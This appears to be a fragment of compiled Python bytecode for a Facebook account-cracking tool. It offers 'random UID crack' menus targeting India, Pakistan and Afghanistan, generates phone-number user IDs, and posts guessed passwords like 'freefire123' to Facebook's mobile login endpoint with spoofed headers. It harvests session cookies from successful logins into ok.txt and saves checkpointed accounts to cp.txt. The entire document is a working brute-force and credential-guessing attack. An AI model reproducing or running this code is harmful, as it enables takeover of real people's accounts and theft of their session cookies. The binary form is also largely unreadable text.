x00d\x00S\x00|\x00d\tk\x02\x00\x00\x00\x00r\x10t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x00S\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\n\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x00S\x00)\x0bNr\x07\x00\x00\x00r\x08\x00\x00\x00z"\x1b[1;36m [1] INDIA RANDOM UID CRACKz-\x1b[1;92m [2] PAKISTAN AND AFG RANDOM UID CRACKz\x16\x1b[1;37m [3] FILE CLONEz\x15\x1b[1;32m [\x1a] CHOOSE : r\t\x00\x00\x00\xda\x012\xda\x010z!\x1b[1;91mChoose valid option\x1b[0;97m)\x08r\n\x00\x00\x00r\x0b\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00r\x0e\x00\x00\x00\xda\rrandom_number\xda\x11random_pak_numberr\x13\x00\x00\x00r\x10\x00\x00\x00s\x01\x00\x00\x00 r\x12\x00\x00\x00r\x0f\x00\x00\x00r\x0f\x00\x00\x00,\x01\x00\x00s\xcc\x00\x00\x00\x80\x00\xe5\x01\x03\x84\x19\x887\xd1\x01\x13\xd4\x01\x13\xd0\x01\x13\xe5\x01\x06\x85t\x81\x1b\x84\x1b\x80\x1b\xe5\x01\x06\x80v\x81\x1d\x84\x1d\x80\x1d\xe5\x01\x06\xd0\x07.\xd1\x01/\xd4\x01/\xd0\x01/\xe5\x01\x06\xd0\x079\xd1\x01:\xd4\x01:\xd0\x01:\xe5\x01\x06\xd0\x07"\xd1\x01#\xd4\x01#\xd0\x01#\xe5\x01\x06\x80v\x81\x1d\x84\x1d\x80\x1d\xe5\x07\x0c\xd0\r\'\xd1\x07(\xd4\x07(\x80\x13\xe0\x04\x07\x88#\x82I\x80I\xe5\x02\x0f\x81/\x84/\x80/\x80/\x80/\xe0\x06\t\x88C\x82i\x80i\xe5\x02\x13\xd1\x02\x15\xd4\x02\x15\xd0\x02\x15\xd0\x02\x15\xd0\x02\x15\xe0\x06\t\x88C\x82i\x80i\xe5\x02\x06\x81&\x84&\x80&\x80&\x80&\xf5\x08\x00\x03\x08\xd0\x081\xd1\x022\xd4\x022\xd0\x022\xd0\x022\xd0\x022r\x14\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x03\x00\x00\x00\xf3~\x04\x00\x00\x97\x00g\x00}\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x04\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x01t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x02t\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00]C}\x03d\x06\xa0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x07\x84\x00t\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x08\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x04|\x00\xa0\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x04\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x8cDt\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\t\xac\n\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x05t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x17\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x06t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0b|\x06z\x00\x00\x00d\x0cz\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\r\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0e|\x01z\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0f\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00|\x00D\x00];}\x07|\x01|\x07z\x00\x00\x00}\x08|\x08d\x00d\x08\x85\x02\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00}\t|\x07g\x01}\n|\x01|\x07z\x00\x00\x00|\td\x10d\x11d\x12g\x05}\n|\x05\xa0\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x08|\n|\x06\xa6\x04\x00\x00\xab\x04\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x8c<\t\x00d\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x13\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x14\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x15\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x1d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x00S\x00)\x16Nr\x07\x00\x00\x00r\x08\x00\x00\x00z4\x1b[1;36m [+] FOR INDIAN ENTER FOUR DIGIT CODE (9192) z\x1a\x1b[1;37m [ \x1a ]INPUT CODE : z \x1b[1;33m [\x1a] HOW TO LIMT 50000 : r\x12\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x003\x00\x00\x00\xf3R\x00\x00\x00K\x00\x01\x00\x97\x00|\x00]"}\x01t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00t\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00V\x00\x97\x01\x01\x00\x8c#d\x00S\x00\xa9\x01N\xa9\x04\xda\x06random\xda\x06choice\xda\x06string\xda\x06digits\xa9\x02r \x00\x00\x00\xda\x01_s\x02\x00\x00\x00  r\x12\x00\x00\x00\xfa\t<genexpr>z random_number.<locals>.<genexpr>f\x01\x00\x00\xf3.\x00\x00\x00\xe8\x00\xe8\x00\x80\x00\xd0\x0f?\xd0\x0f?\xb0\x11\x95\x06\x94\r\x9df\x9cm\xd1\x10,\xd4\x10,\xd0\x0f?\xd0\x0f?\xd0\x0f?\xd0\x0f?\xd0\x0f?\xd0\x0f?r\x14\x00\x00\x00\xe9\x06\x00\x00\x00\xe9\x1e\x00\x00\x00\xa9\x01\xda\x0bmax_workersz$\x1b[1;31m [\x1a\x1a]TOTAL IDZ             : z\x08 ~> [ \x1a]z)\x1b[1;32m [\x1a]COUNTRY YOU CHOOSE    : INDIA z#\x1b[1;33m [\x1a]NUMBER YOU PUT        : z&\x1b[1;35m [\x1a]USE FLIGHT MOD 5 \x1a\x1a SECOND z\tfree firez\ni love you\xda\x0bfreefire123\xf5&\x00\x00\x00[\xe2\x9c\x93] Crack process has been completedz%[?] Ids saved in PRINCE ok.txt,cp.txt\xfa\x19 Press Inter To Back Menu\xa9\x0fr\n\x00\x00\x00r\x0b\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00r\x0e\x00\x00\x00\xda\x03intr1\x00\x00\x00\xda\x04join\xda\x06append\xda\nThreadPool\xda\x03strr-\x00\x00\x00\xda\x06submit\xda\x06rcrackr\x13\x00\x00\x00)\x0b\xda\x04user\xda\x04kode\xda\x05limit\xda\x04nmbr\xda\x03nmp\xda\x05yaari\xda\x02tl\xda\x04guru\xda\x03uid\xda\x02mk\xda\x03pwxs\x0b\x00\x00\x00           r\x12\x00\x00\x00r<\x00\x00\x00r<\x00\x00\x00P\x01\x00\x00s_\x02\x00\x00\x80\x00\xe0\x06\x08\x80\x14\xe5\x01\x03\x84\x19\x887\xd1\x01\x13\xd4\x01\x13\xd0\x01\x13\xe5\x01\x06\x85t\x81\x1b\x84\x1b\x80\x1b\xe5\x01\x06\x80v\x81\x1d\x84\x1d\x80\x1d\xe5\x01\x06\xd0\x07@\xd1\x01A\xd4\x01A\xd0\x01A\xe5\x01\x06\x80v\x81\x1d\x84\x1d\x80\x1d\xe5\x08\r\xd0\x0e-\xd1\x08.\xd4\x08.\x80\x14\xe5\x01\x06\x80v\x81\x1d\x84\x1d\x80\x1d\xe5\t\x0c\x8dU\xd0\x138\xd1\r9\xd4\r9\xd1\t:\xd4\t:\x80\x15\xe5\r\x12\x905\x89\\\x8c\\\xf0\x00\x04\x02\x13\xf0\x00\x04\x02\x13\x80T\xe0\x08\n\x8f\x07\x8a\x07\xd0\x0f?\xd0\x0f?\xb5e\xb8A\xb1h\xb4h\xd0\x0f?\xd1\x0f?\xd4\x0f?\xd1\x08?\xd4\x08?\x80#\xe0\x02\x06\x87+\x82+\x88c\xd1\x02\x12\xd4\x02\x12\xd0\x02\x12\xd0\x02\x12\xe5\x06\x10\x98R\xd0\x06 \xd1\x06 \xd4\x06 \xf0\x00\x13\x02#\xa0E\xe5\x02\x04\x84)\x88G\xd1\x02\x14\xd4\x02\x14\xd0\x02\x14\xe5\x02\x07\x8d\x04\x81+\x84+\x80+\xe5\x07\n\x8d3\x88t\x899\x8c9\x81~\x84~\x80"\xdd\x02\x07\xd0\x082\xb02\xd1\x085\xb0j\xd1\x08@\xd1\x02A\xd4\x02A\xd0\x02A\xdd\x02\x07\xd0\x087\xd1\x028\xd4\x028\xd0\x028\xdd\x02\x07\xd0\x081\xb0$\xd1\x086\xd1\x027\xd4\x027\xd0\x027\xdd\x02\x07\xd0\x084\xd1\x025\xd4\x025\xd0\x025\xf5\x06\x00\x03\x08\x88\x06\x81-\x84-\x80-\xd8\x0e\x12\xf0\x00\x05\x03#\xf0\x00\x05\x03#\x80d\xd8\t\r\x88d\x89\x19\x803\xd8\x08\x0b\x88B\x88Q\x88B\x8c\x07\x802\xd8\n\x0e\x88\x16\x803\xd8\n\x0e\x88t\x89)\x90B\x90{\xa0<\xb0\r\xd0\t>\x803\xd8\x03\x08\x87<\x82<\x95\x06\x90s\x983\x98r\xd1\x03"\xd4\x03"\xd0\x03"\xd0\x03"\xf0\x0b\x05\x03#\xf0\x1d\x13\x02#\xf0\x00\x13\x02#\xf0\x00\x13\x02#\xf1\x00\x13\x02#\xf4\x00\x13\x02#\xf0\x00\x13\x02#\xf0\x00\x13\x02#\xf0\x00\x13\x02#\xf0\x00\x13\x02#\xf0\x00\x13\x02#\xf0\x00\x13\x02#\xf8\xf8\xf8\xf0\x00\x13\x02#\xf0\x00\x13\x02#\xf0\x00\x13\x02#\xf0\x00\x13\x02#\xf5*\x00\x02\x07\x80v\x81\x1d\x84\x1d\x80\x1d\xe5\x01\x06\xd0\x07/\xd1\x010\xd4\x010\xd0\x010\xe5\x01\x06\xd0\x07.\xd1\x01/\xd4\x01/\xd0\x01/\xe5\x01\x06\x80v\x81\x1d\x84\x1d\x80\x1d\xe5\x01\x06\xd0\x07"\xd1\x01#\xd4\x01#\xd0\x01#\xe5\x01\x05\x81\x16\x84\x16\x80\x16\x80\x16\x80\x16s\x13\x00\x00\x00\xc35C\x17G\x19\x03\xc7\x19\x04G\x1d\x07\xc7 \x01G\x1d\x07c\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x03\x00\x00\x00\xf3`\x07\x00\x00\x97\x00\t\x00|\x01D\x00\x90\x03]#}\x03t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00t\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x05|\x04\xa0\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00}\x06t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x08\x00\x00\x00\x00\x00\x00\x00\x00d\x02t\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x06\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\xa0\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x08\x00\x00\x00\x00\x00\x00\x00\x00d\x04t\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x06\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\xa0\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x08\x00\x00\x00\x00\x00\x00\x00\x00d\x05t\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x06\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\xa0\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x08\x00\x00\x00\x00\x00\x00\x00\x00d\x06t\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x06\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\xa0\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x07d\x07|\x00|\x03d\x08d\t\x9c\t}\x07i\x00d\nd\x0b\x93\x01d\x0cd\r\x93\x01d\x0ed\x0f\x93\x01d\x10d\x11\x93\x01d\x12d\x13\x93\x01d\x14d\x15\x93\x01d\x16d\x17\x93\x01d\x18d\x19\x93\x01d\x1ad\x1b\x93\x01d\x1cd\x1d\x93\x01d\x1ed\x1f\x93\x01d d!\x93\x01d"d#\x93\x01d$d%\x93\x01d&d\'\x93\x01d(d)\x93\x01d*d+\x93\x01d,d!d-d.d/\x9c\x04\xa5\x01}\x08|\x04\xa0\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d0|\x07|\x08\xac1\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00}\t|\x04j\x0c\x00\x00\x00\x00\x00\x00\x00\x00\xa0\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x0e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\nd2|\nv\x00r\xc4d3\xa0\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d4\x84\x00|\x04j\x0c\x00\x00\x00\x00\x00\x00\x00\x00\xa0\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x0bd5d6\x85\x02\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x0ct#\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d7|\x00z\x00\x00\x00d8z\x00\x00\x00|\x03z\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t#\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d9|\x0b\x9b\x00\x9d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t%\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d:d;\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00d8z\x00\x00\x00|\x03z\x00\x00\x00d<z\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x01\x00n\xb8d=|\nv\x00r\xb2d3\xa0\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d>\x84\x00|\x04j\x0c\x00\x00\x00\x00\x00\x00\x00\x00\xa0\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x0b|\x0bd?d@\x85\x02\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x0ct#\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00dA|\x00z\x00\x00\x00d8z\x00\x00\x00|\x03z\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t%\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00dBd;\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00d8z\x00\x00\x00|\x03z\x00\x00\x00d<z\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x01\x00n\x02\x90\x03\x8c%t.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03z\r\x00\x00a\x17t0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x19\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00dCt.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00dD|\x02\x9b\x00dEt5\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00dFt5\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00dG\x9d\t\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x19\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x1b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x00S\x00#\x00\x01\x00Y\x00d\x00S\x00x\x03Y\x00w\x01)HN\xfa\x19https://free.facebook.com\xfa\x18name="lsd" value="(.*?)"r%\x00\x00\x00\xfa\x1cname="jazoest" value="(.*?)"\xfa\x19name="m_ts" value="(.*?)"\xfa\x17name="li" value="(.*?)"r;\x00\x00\x00\xfa\x06Log In\xa9\t\xda\x03lsd\xda\x07jazoest\xda\x04m_ts\xda\x02li\xda\ntry_number\xda\x12unrecognized_tries\xda\x05email\xda\x04pass\xda\x05login\xda\tauthorityz\x0ex.facebook.comr\x1a\x00\x00\x00\xda\x04POST\xda\x06scheme\xda\x05https\xda\x06accept\xfa\x87text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\xfa\x0faccept-languagez\x0een-US,en;q=0.9\xfa\rcache-control\xfa\tmax-age=0\xda\x03dprr:\x00\x00\x00z\tsave-data\xda\x02on\xfa\x1bsec-ch-prefers-color-scheme\xda\x05light\xfa\tsec-ch-ua\xfa("Not)A;Brand";v="24", "Chromium";v="116"\xfa\x1bsec-ch-ua-full-version-list\xfa8"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"\xfa\x10sec-ch-ua-mobile\xfa\x02?1\xfa\x0fsec-ch-ua-modelz\x0b"vivo 1901"\xfa\x12sec-ch-ua-platform\xfa\t"Android"\xfa\x1asec-ch-ua-platform-versionz\x08"11.0.0"\xfa\x0esec-fetch-dest\xda\x08document\xfa\x0esec-fetch-mode\xda\x08navigate\xda\x04noner\t\x00\x00\x00\xfaoMozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36)\x04\xfa\x0esec-fetch-site\xfa\x0esec-fetch-user\xfa\x19upgrade-insecure-requests\xfa\nuser-agent\xfa[https://x.facebook.com//login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8\xa9\x02\xda\x04data\xda\x07headers\xda\x06c_user\xfa\x01;c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x13\x00\x00\x00\xf3$\x00\x00\x00\x97\x00g\x00|\x00]\r\\\x02\x00\x00}\x01}\x02|\x01d\x00z\x00\x00\x00|\x02z\x00\x00\x00\x91\x02\x8c\x0eS\x00\xa9\x01\xfa\x01=r\x1c\x00\x00\x00\xa9\x03r \x00\x00\x00\xda\x03key\xda\x05values\x03\x00\x00\x00   r\x12\x00\x00\x00r"\x00\x00\x00z\x1arcrack.<locals>.<listcomp>\xd2\x01\x00\x00\xf3$\x00\x00\x00\x80\x00\xd0\x12U\xd0\x12U\xd0\x12U\xa1Y\xa0S\xa8\x15\x903\x90s\x917\x985\x91=\xd0\x12U\xd0\x12U\xd0\x12Ur\x14\x00\x00\x00\xe9\x07\x00\x00\x00\xe9\x16\x00\x00\x00z\x17\r\x1b[1;32m[SAMI FIRE-OK] \xfa\x03 | z\n Cookie : \xfa\x06ok.txt\xda\x01a\xfa\x01\n\xda\ncheckpointc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x13\x00\x00\x00\xf3$\x00\x00\x00\x97\x00g\x00|\x00]\r\\\x02\x00\x00}\x01}\x02|\x01d\x00z\x00\x00\x00|\x02z\x00\x00\x00\x91\x02\x8c\x0eS\x00r\x9d\x00\x00\x00r\x1c\x00\x00\x00r\x9f\x00\x00\x00s\x03\x00\x00\x00   r\x12\x00\x00\x00r"\x00\x00\x00z\x1arcrack.<locals>.<listcomp>\xe2\x01\x00\x00r\xa2\x00\x00\x00r\x14\x00\x00\x00\xe9R\x00\x00\x00\xe9a\x00\x00\x00z\x12\r\x1b[1;31m[SAMI-CP] \xfa\x06cp.txtz\x19\r\x1b[1;32m[ SAMI ]\x1b[1;32m [\xfa\x01|z\x0e] \x1b[1;32m[Ok][z\x07] [Cp][z\x02] 